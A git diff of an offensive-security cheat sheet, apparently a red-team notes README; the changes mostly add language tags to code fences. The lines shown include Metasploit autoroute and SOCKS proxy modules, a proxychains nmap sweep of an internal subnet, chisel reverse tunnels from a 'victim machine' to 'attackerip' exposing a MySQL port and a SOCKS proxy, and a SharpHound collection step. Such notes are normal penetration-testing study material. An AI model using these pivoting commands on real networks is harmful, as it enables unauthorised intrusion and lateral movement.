@@ -12,7 +12,7 @@ Enjoy creating your own 🦠
 <br>
 
 # Table of Contents
-<br>
+<br>'
 
 # [DotnetToJScript](#DotNetToJscript-1)
 - [Testclass](#testclass)
@@ -1059,7 +1059,7 @@ proxychains4 nmap 192.168.1.0/24
 
 ### autorun
 
-```
+```bash
 post/multi/manage/autoroute
 set session x
 run
@@ -1073,12 +1073,12 @@ auxiliary/server/socks_proxy
 ### Port Forwarding
 
 #### Attacker Machine:
-```
+```powershell
 chisel server -p 6666 --reverse
 ```
 
 #### Victim Machine:
-```
+```powershell
 chisel client attackerip:6666 R:2222:127.0.0.1:3306/tcp
 ```
 <br>
@@ -1086,18 +1086,18 @@ chisel client attackerip:6666 R:2222:127.0.0.1:3306/tcp
 ### SOCKS Proxy
 
 #### Attacker Machine:
-```
+```powershell
 chisel server -p 6666 --socks5 --reverse
 ```
 
 #### Victim Machine:
-```
+```powershell
 chisel client attackerip:6666 R:5000:socks
 ```
 
 ## Bloodhound
 
-```
+```powershell
 # run the collector on the machine using SharpHound.exe
 # https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe
 # /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe
